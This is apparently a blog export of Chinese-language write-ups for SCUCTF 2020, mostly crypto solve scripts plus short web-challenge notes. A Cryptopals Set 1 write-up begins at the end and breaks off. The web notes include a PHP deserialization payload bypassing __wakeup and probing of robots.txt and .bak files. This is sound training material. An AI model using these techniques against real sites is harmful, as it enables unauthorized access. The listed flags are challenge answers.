<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prime_list = []</span><br><span class="line">c_list = []</span><br><span class="line">inverse_list=[]</span><br><span class="line">m = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    m*=prime_list[i]</span><br><span class="line">M_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    M_list.append(m//prime_list[i])</span><br><span class="line">inverse_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    inv = inverse(M_list[i],prime_list[i])</span><br><span class="line">    inverse_list.append(inv)</span><br><span class="line">result =  <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    result+=inverse_list[i]*M_list[i]*c_list[i]</span><br><span class="line">result %= m</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    f = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> result % prime_list[i] != c_list[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;false&quot;</span>)</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag is scuctf&#123; %d&#125;&quot;</span>%(result%<span class="number">1145141145141145141145141919810</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得到 flag=<code>scuctf&#123;234970795255267031279059393553&#125;</code></p>
<hr>
<h3 id="RSA-2"><a href="#RSA-2" class="headerlink" title="RSA_2"></a>RSA_2</h3><p>使用工具可将n分解为多个素数,然后即可按原理求解<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">21280377217500047527333756734822477656202976970565771310208586426341167199342722337358334403397116963913950346969157</span></span><br><span class="line">c = <span class="number">7162732898109470668490761172640544970587920562229245172318483665877098759808623298921271357899945260719802967519239</span></span><br><span class="line">r = <span class="number">199045230832669039221046041578658179479</span></span><br><span class="line">s = <span class="number">319438022064098846441615805897528174851</span></span><br><span class="line">t = <span class="number">334688613728124045578795340681788885633</span></span><br><span class="line">phi = (r-<span class="number">1</span>)*(s-<span class="number">1</span>)*(t-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(r*s*t)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">decode =<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(decode)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


<hr>
<h3 id="math-2"><a href="#math-2" class="headerlink" title="math_2"></a>math_2</h3><p>求解二次剩余，从网上找了一个求解二次剩余的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick_power</span>(<span class="params">a, b, p</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    求快速幂。ret = a^b%p。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        a: 底数。大于等于0并且是整数。</span></span><br><span class="line"><span class="string">        b: 指数。大于等于0并且是整数。</span></span><br><span class="line"><span class="string">        p: 模数。大于0并且是整数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        返回结果。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Raises:</span></span><br><span class="line"><span class="string">        IOError: 无错误。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = a % p</span><br><span class="line">    ans = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b &amp; <span class="number">1</span>:</span><br><span class="line">            ans = (ans * a) % p</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">        a = (a * a) % p</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_have_sqrt_model</span>(<span class="params">x, p</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        是否有模平方根y*y=x mod p,已知x,p,判断是否存在y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            x: 大于0并且小于p的整数。</span></span><br><span class="line"><span class="string">            p: 质数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            返回结果,true表示有模平方根;false表示没有模平方根。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            IOError: 无错误。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ret = quick_power(x, (p - <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">    <span class="keyword">if</span> ret == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sqrt_model</span>(<span class="params">x, p</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        求模平方根y*y=x mod p,已知x,p求y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            x: 大于0并且小于p的整数。</span></span><br><span class="line"><span class="string">            p: 质数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            返回结果y。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            IOError: 无错误。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> is_have_sqrt_model(x, p):</span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="comment"># p-1=(2^t)*s //s是奇数</span></span><br><span class="line">        s = p - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = s // <span class="number">2</span></span><br><span class="line">            t = t + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1</span>:</span><br><span class="line">            ret = quick_power(x, (s + <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">            <span class="keyword">return</span> ret, p - ret</span><br><span class="line">        <span class="keyword">elif</span> t &gt;= <span class="number">2</span>:</span><br><span class="line">            x_ = quick_power(x, p - <span class="number">2</span>, p)</span><br><span class="line">            n = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> is_have_sqrt_model(n, p):</span><br><span class="line">                n = n + <span class="number">1</span></span><br><span class="line">            b = quick_power(n, s, p)</span><br><span class="line">            ret = quick_power(x, (s + <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">            t_ = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> t - <span class="number">1</span> &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> quick_power(x_ * ret * ret, <span class="number">2</span> ** (t - <span class="number">2</span>), p) == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ret = ret * (b ** (<span class="number">2</span> ** t_)) % p</span><br><span class="line">                t = t - <span class="number">1</span></span><br><span class="line">                t_ = t_ + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret, p - ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">2</span>, -<span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(get_sqrt_model(<span class="number">11451419198101926081719260817111</span>, <span class="number">8497980875583539713991243773941802042180496489377326522174599746685528850719812035800799014030522052269804143947777659192760008656733593814889715667890907</span>))</span><br></pre></td></tr></table></figure>
<p>找到对应的解，代入j即可获得flag</p>
<hr>
<h3 id="baby-pad"><a href="#baby-pad" class="headerlink" title="baby_pad"></a>baby_pad</h3><p>观察pad与密文可知,密文后方加了5个‘0x05’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">M</span>):</span></span><br><span class="line">    pad_length = <span class="number">16</span>-<span class="built_in">len</span>(M)%<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> M.decode()+<span class="built_in">chr</span>(pad_length)*pad_length</span><br><span class="line">cipher = <span class="string">&#x27;0b1b0d1b0c1e031d190b01270c0a111b13131313050505050505050505050505&#x27;</span></span><br></pre></td></tr></table></figure>

<p>按照异或运算，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">cipher = <span class="string">b&quot;\x0b\x1b\r\x1b\x0c\x1e\x03\x1d\x19\x0b\x01&#x27;\x0c\n\x11\x1b\x13\x13\x13\x13\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05&quot;</span>.decode()</span><br><span class="line"></span><br><span class="line">pad_decoded = cipher[:-<span class="number">5</span>].encode()</span><br><span class="line">key = <span class="string">b&#x27;x&#x27;</span>*<span class="built_in">len</span>(pad_decoded)</span><br><span class="line"><span class="built_in">print</span>(strxor(pad_decoded,key).decode())</span><br></pre></td></tr></table></figure>
<p>flag为 <code>scuctf&#123;easy_trickkkk&#125;&#125;&#125;&#125;&#125;&#125;&#125;</code></p>
<hr>
<h3 id="classic-3"><a href="#classic-3" class="headerlink" title="classic_3"></a>classic_3</h3><p>将题目问题转换为类似问题<br><a class="link"   href="https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/" >类似题<i class="fas fa-external-link-alt"></i></a><br>题目代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, plain <span class="comment">#plain is an English paragraph containing uppercase and lowercase letters, spaces and punctuation marks.</span></span><br><span class="line">key = flag.strip(<span class="string">&quot;scuctf&#123;&quot;</span>).strip(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">ki = cycle(key)</span><br><span class="line">cipher  = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(((<span class="built_in">ord</span>(<span class="built_in">next</span>(ki))^<span class="built_in">ord</span>(p))+<span class="number">1</span>)%<span class="number">256</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="built_in">print</span>(cipher.encode().<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment">#output: 1f124d150f1f460159124952072041541d584438011e0e175f780d1944190d1755451d0e141504470108120d264a05020918254a4d0b1c4e131644551d5c074d561517120d264a0802171739094144071a4604520849480c0a15131555442d1017080b1f3f17050e0b1f1759111e1d14150e4854085a07640d0108071b780b0b440e090a1e561345140b19150513434438021649010339070544010c461e5f181b57081a591b0849506401054913142546190c0b4e17125208085e440453544059052c1e5d490d0778130e11501a0e1211080e5311045b541d5844080903040c1825174144071a4604520849480c0a150104440b2e0f51080453400b1d07444e0d0111040a4144195d1754470b2e1e161b461e324609071d1e051e43594945074d5d13181207360d0312121b3f0c0c440e09041c431249471141150517120c230e51070b07400d03055010011360070e1417201954055544350d030e46143c0a4d0501050c141111024207104154085f440c0d121f011d7c461c07501b010756550a60104d541d1b6005640e1a1b01122446190c0b4e0b0159121b14150e4e5f5f590e641b190818077c46190c0b4e1612431e0858441c560154430d6e4a170a18533c0d0807501a0e1211051b57110a5b085442073201200d4a53240e0e18501f0b1a565508564406410154600d2b1b1a0e170778051a180803181e451e0e4144065b011b4318270e51080c533f1220440e090d1b58551b57010a5e061756506410201b4616390b094401204613600749571606596054590e641e190e460223160a12040d121e47124958070c471717120d264a14080903371806110104461c5f19121e</span></span><br></pre></td></tr></table></figure>

<p>首先去1，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;1f124d150f1f460159124952072041541d584438011e0e175f780d1944190d1755451d0e141504470108120d264a05020918254a4d0b1c4e131644551d5c074d561517120d264a0802171739094144071a4604520849480c0a15131555442d1017080b1f3f17050e0b1f1759111e1d14150e4854085a07640d0108071b780b0b440e090a1e561345140b19150513434438021649010339070544010c461e5f181b57081a591b0849506401054913142546190c0b4e17125208085e440453544059052c1e5d490d0778130e11501a0e1211080e5311045b541d5844080903040c1825174144071a4604520849480c0a150104440b2e0f51080453400b1d07444e0d0111040a4144195d1754470b2e1e161b461e324609071d1e051e43594945074d5d13181207360d0312121b3f0c0c440e09041c431249471141150517120c230e51070b07400d03055010011360070e1417201954055544350d030e46143c0a4d0501050c141111024207104154085f440c0d121f011d7c461c07501b010756550a60104d541d1b6005640e1a1b01122446190c0b4e0b0159121b14150e4e5f5f590e641b190818077c46190c0b4e1612431e0858441c560154430d6e4a170a18533c0d0807501a0e1211051b57110a5b085442073201200d4a53240e0e18501f0b1a565508564406410154600d2b1b1a0e170778051a180803181e451e0e4144065b011b4318270e51080c533f1220440e090d1b58551b57010a5e061756506410201b4616390b094401204613600749571606596054590e641e190e460223160a12040d121e47124958070c471717120d264a14080903371806110104461c5f19121e&#x27;</span></span><br><span class="line">cipher_after =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(cipher)/<span class="number">2</span>)):</span><br><span class="line">    temp = cipher[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    temphex_int = <span class="built_in">ord</span>(binascii.a2b_hex(temp).decode()) - <span class="number">1</span></span><br><span class="line">    temp_re = <span class="built_in">hex</span>((temphex_int)%<span class="number">256</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    cipher_after += temp_re</span><br><span class="line"><span class="built_in">print</span>(cipher_after)</span><br></pre></td></tr></table></figure>
<p>使用相似题目的解题脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &gt; <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a[:<span class="built_in">len</span>(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b[:<span class="built_in">len</span>(a)])])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span>(<span class="params">b1, b2</span>):</span></span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += <span class="built_in">bin</span>(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"><span class="comment"># text = &#x27;&#x27;</span></span><br><span class="line"><span class="comment"># with open(&quot;6.txt&quot;,&quot;r&quot;) as f:</span></span><br><span class="line"><span class="comment">#     for line in f:</span></span><br><span class="line"><span class="comment">#         text += line</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = base64.b64decode(text)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_single_key_xor</span>(<span class="params">text</span>):</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">miwen_after = <span class="string">&#x27;1e114c140e1e450058114851061f40531c574337001d0d165e770c1843180c1654441c0d131403460007110c25490401081724494c0a1b4d121543541c5b064c551416110c2549070116163808404306194503510748470b0914121454432c0f16070a1e3e16040d0a1e1658101d1c13140d4753075906630c0007061a770a0a430d08091d551244130a18140412424337011548000238060443000b451d5e171a560719581a07484f6300044812132445180b0a4d16115107075d430352533f58042b1d5c480c0677120d104f190d1110070d5210035a531c5743070802030b172416404306194503510748470b09140003430a2d0e500703523f0a1c06434d0c001003094043185c1653460a2d1d151a451d314508061c1d041d42584844064c5c12171106350c0211111a3e0b0b430d08031b421148461040140416110b220d50060a063f0c02044f0f00125f060d13161f1853045443340c020d45133b094c0400040b1310100141060f4053075e430b0c111e001c7b451b064f1a00065554095f0f4c531c1a5f04630d191a00112345180b0a4d0a0058111a13140d4d5e5e580d631a180717067b45180b0a4d1511421d0757431b550053420c6d49160917523b0c07064f190d1110041a5610095a0753410631001f0c4952230d0d174f1e0a195554075543054000535f0c2a1a190d1606770419170702171d441d0d4043055a001a4217260d50070b523e111f430d080c1a57541a5600095d0516554f630f1f1a4515380a0843001f45125f0648561505585f53580d631d180d450122150911030c111d46114857060b461616110c254913070802361705100003451b5e18111d&#x27;</span></span><br><span class="line">b=binascii.a2b_hex(miwen_after)</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="comment">#我们取其中前6段计算平局汉明距离</span></span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = <span class="built_in">float</span>(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) +</span><br><span class="line">        hamming_distance(b5, b6)</span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = <span class="built_in">sorted</span>(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = <span class="built_in">bytearray</span>(keys * <span class="built_in">len</span>(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        s = <span class="built_in">bytes</span>.decode(plaintext)</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>结果如下<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/classic_3.png"></p>
<hr>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><hr>
<h3 id="渣男日记"><a href="#渣男日记" class="headerlink" title="渣男日记"></a>渣男日记</h3><p><code>/www.zip</code>下载源码</p>
<p>一道反序列化，主要思路是绕过wakeup<br>序列化构造如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload=O:<span class="number">4</span>:<span class="string">&quot;Love&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;520&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>得到结果<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/zhananriji.png"></p>
<hr>
<h3 id="easyheehee"><a href="#easyheehee" class="headerlink" title="easyheehee"></a>easyheehee</h3><p>利用burp抓包，发现cookie,然后拖进base64二次解码，得到ffflllaaaggg.php然后加到原题目网址后面得到flag<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easyheehee1.png"></p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easyheehee2.png"></p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easyheehee3.png"></p>
<hr>
<h3 id="豪哥哥的情感日记"><a href="#豪哥哥的情感日记" class="headerlink" title="豪哥哥的情感日记"></a>豪哥哥的情感日记</h3><p>一直点就能看见flag</p>
<hr>
<h3 id="easyhtml"><a href="#easyhtml" class="headerlink" title="easyhtml"></a>easyhtml</h3><p>F12查看网页源代码就能看见flag<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easyhtml.png"></p>
<hr>
<h3 id="我爬我爬"><a href="#我爬我爬" class="headerlink" title="我爬我爬"></a>我爬我爬</h3><p>先在网址后面加上robots.txt,提示说在ffflllaaaggg.html里，然后在网址后面加上后，得到flag<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/wopawopa1.png"></p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/wopawopa2.png"></p>
<hr>
<h3 id="别看我后面"><a href="#别看我后面" class="headerlink" title="别看我后面"></a>别看我后面</h3><p>php的备份名是php.bak，打开以后是php代码，读出来应该在网址后面加?Psw=5201314，然后得到flag<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/phpbak1.png"></p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/phpbak2.png"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Cryptopals Write-Up</title>
    <url>/2021/09/23/Cryptopals-Write-Up/</url>
    <content><![CDATA[<h1 id="Cryptopals-Write-Up"><a href="#Cryptopals-Write-Up" class="headerlink" title="Cryptopals Write-Up"></a>Cryptopals Write-Up</h1><h2 id="Set-1"><a href="#Set-1" class="headerlink" title="Set 1"></a>Set 1</h2><h3 id="0x01-Convert-hex-to-base64"><a href="#0x01-Convert-hex-to-base64" class="headerlink" title="0x01 Convert hex to base64"></a>0x01 Convert hex to base64</h3><p>The string:</p>
<blockquote>
<p>49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d</p>
</blockquote>
<p>Should produce:</p>
<blockquote>
<p>SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t</p>
</blockquote>
<p>solution:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line">hex_s = <span class="string">&#x27;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&#x27;</span></span><br><span class="line"></span><br><span class="line">s = unhexlify(hex_s)</span><br><span class="line"><span class="comment"># b&quot;I&#x27;m killing your brain like a poisonous mushroom&quot;</span></span><br><span class="line">b64_S = b64encode(s)</span><br><span class="line"><span class="comment"># b&#x27;SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-Fixed-XOR"><a href="#0x02-Fixed-XOR" class="headerlink" title="0x02 Fixed XOR"></a>0x02 Fixed XOR</h3><p>Write a function that takes two equal-length buffers and produces their XOR combination.</p>
<blockquote>
<p>1c0111001f010100061a024b53535009181c</p>
</blockquote>
<p>after hex decoding, and when XOR’d against:</p>
<blockquote>
<p>686974207468652062756c6c277320657965</p>
</blockquote>
<p>should produce:</p>
<blockquote>
<p>746865206b696420646f6e277420706c6179</p>
</blockquote>
<p>solution:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="comment"># unhexlify 对象长度为偶数</span></span><br><span class="line">a = unhexlify(<span class="string">&#x27;1c0111001f010100061a024b53535009181c&#x27;</span>)</span><br><span class="line">b = unhexlify(<span class="string">&#x27;686974207468652062756c6c277320657965&#x27;</span>)</span><br><span class="line">xor_res = <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i,j <span class="keyword">in</span>  <span class="built_in">zip</span>(a,b)])</span><br><span class="line"><span class="built_in">print</span>(xor_res)</span><br><span class="line"><span class="comment"># b&#x27;746865206b696420646f6e277420706c6179&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x03-Single-byte-XOR-cipher"><a href="#0x03-Single-byte-XOR-cipher" class="headerlink" title="0x03 Single-byte XOR cipher"></a>0x03 Single-byte XOR cipher</h3><p>The hex encoded string:</p>
<blockquote>
<p>1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736</p>
</blockquote>
<p>has been XOR’d against a single character. Find the key, decrypt the message.</p>
<p>solution:</p>
